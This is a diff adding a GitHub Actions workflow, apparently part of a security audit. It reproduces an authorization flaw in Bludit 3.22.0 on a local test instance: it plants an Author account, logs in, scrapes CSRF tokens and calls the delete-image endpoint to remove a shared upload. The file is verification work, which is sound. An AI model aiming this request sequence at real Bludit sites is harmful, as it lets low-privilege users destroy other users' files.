@@ -1,0 +1,113 @@
+name: Bludit 3.22.0 author shared-upload deletion verification
+on:
+  push:
+    branches:
+      - security-audit/bludit-live-test
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  author-global-upload-delete:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          repository: bludit/bludit
+          ref: 3.22.0
+          path: bludit
+      - uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.3'
+          extensions: gd, mbstring, xml, zip, fileinfo
+          coverage: none
+      - name: Reproduce with an Author account on upstream stable tag
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat >/tmp/router.php <<'PHP'
+          <?php
+          $root = getenv('BLUDIT_ROOT');
+          $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+          if ($path !== '/' && is_file($root . $path)) return false;
+          $_SERVER['DOCUMENT_ROOT'] = $root;
+          $_SERVER['SCRIPT_NAME'] = '/index.php';
+          $_SERVER['PHP_SELF'] = '/index.php';
+          require $root . '/index.php';
+          PHP
+          export BLUDIT_ROOT="$GITHUB_WORKSPACE/bludit"
+          php -S 127.0.0.1:8080 -t "$BLUDIT_ROOT" /tmp/router.php >/tmp/bludit-stable-server.log 2>&1 &
+          for i in $(seq 1 40); do
+            if curl -sS http://127.0.0.1:8080/install.php >/dev/null; then break; fi
+            sleep 1
+          done
+          curl -fsS 'http://127.0.0.1:8080/install.php?demo=true' >/dev/null
+          test -f "$BLUDIT_ROOT/bl-content/databases/users.php"
+          php -r '
+          $p="bludit/bl-content/databases/users.php";
+          $s=file_get_contents($p); $i=strpos($s,"?>");
+          if ($i===false) exit(2);
+          $prefix=substr($s,0,$i+2);
+          $d=json_decode(substr($s,$i+2),true);
+          $u="auditattacker";
+          $salt="audit-salt-2026";
+          $d[$u]=array(
+            "firstName"=>"Audit","lastName"=>"Author","nickname"=>"auditattacker",
+            "description"=>"synthetic test account","role"=>"author",
+            "password"=>sha1("AttackerPass123!".$salt),"salt"=>$salt,
+            "email"=>"","registered"=>date("Y-m-d H:i"),
+            "tokenRemember"=>"","tokenAuth"=>bin2hex(random_bytes(64)),
+            "tokenAuthTTL"=>"2099-01-01 00:00",
+            "twitter"=>"","facebook"=>"","codepen"=>"","instagram"=>"",
+            "github"=>"","gitlab"=>"","linkedin"=>"","mastodon"=>"","vk"=>"",
+            "youtube"=>"","bluesky"=>""
+          );
+          file_put_contents($p,$prefix.PHP_EOL.json_encode($d,JSON_PRETTY_PRINT));
+          '
+          jar=/tmp/author.cookies
+          BASE='http://127.0.0.1:8080'
+          curl -sS -c "$jar" -b "$jar" "$BASE/admin/login" -o /tmp/login.html
+          csrf="$(python3 - <<'PY'
+          import re
+          s=open('/tmp/login.html',encoding='utf-8',errors='ignore').read()
+          m=re.search(r'name=["\']tokenCSRF["\'][^>]*value=["\']([^"\']+)',s)
+          if not m: m=re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']tokenCSRF["\']',s)
+          print(m.group(1) if m else '')
+          PY
+          )"
+          test -n "$csrf"
+          login_code="$(curl -sS -o /tmp/login-post.html -w '%{http_code}' -c "$jar" -b "$jar" --data-urlencode 'username=auditattacker' --data-urlencode 'password=AttackerPass123!' --data-urlencode "tokenCSRF=$csrf" "$BASE/admin/login")"
+          echo "Author login HTTP: $login_code"
+          [[ "$login_code" == "301" || "$login_code" == "302" ]]
+          curl -sS -b "$jar" "$BASE/admin/new-content" -o /tmp/new-content.html
+          author_csrf="$(python3 - <<'PY'
+          import re
+          s=open('/tmp/new-content.html',encoding='utf-8',errors='ignore').read()
+          m=re.search(r'name=["\']tokenCSRF["\'][^>]*value=["\']([^"\']+)',s)
+          if not m: m=re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']tokenCSRF["\']',s)
+          print(m.group(1) if m else '')
+          PY
+          )"
+          test -n "$author_csrf" || { echo 'Could not obtain author CSRF token'; sed -n '1,100p' /tmp/new-content.html; exit 1; }
+          printf 'synthetic shared upload' >"$BLUDIT_ROOT/bl-content/uploads/audit-shared-delete.txt"
+          test -f "$BLUDIT_ROOT/bl-content/uploads/audit-shared-delete.txt"
+          delete_code="$(curl -sS -o /tmp/delete.json -w '%{http_code}' -b "$jar" -c "$jar" -X POST --data-urlencode "tokenCSRF=$author_csrf" --data-urlencode 'filename=audit-shared-delete.txt' "$BASE/admin/ajax/delete-image")"
+          echo "Author delete HTTP: $delete_code"
+          cat /tmp/delete.json
+          if [[ "$delete_code" == "200" && ! -e "$BLUDIT_ROOT/bl-content/uploads/audit-shared-delete.txt" ]]; then
+            echo 'CONFIRMED: Author deleted a shared global upload without a page UUID.'
+          else
+            echo 'NOT REPRODUCED: file still exists or request was denied.'
+            exit 1
+          fi
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bludit-3.22.0-author-global-upload-delete
+          path: |
+            /tmp/bludit-stable-server.log
+            /tmp/login.html
+            /tmp/new-content.html
+            /tmp/delete.json
+          if-no-files-found: warn
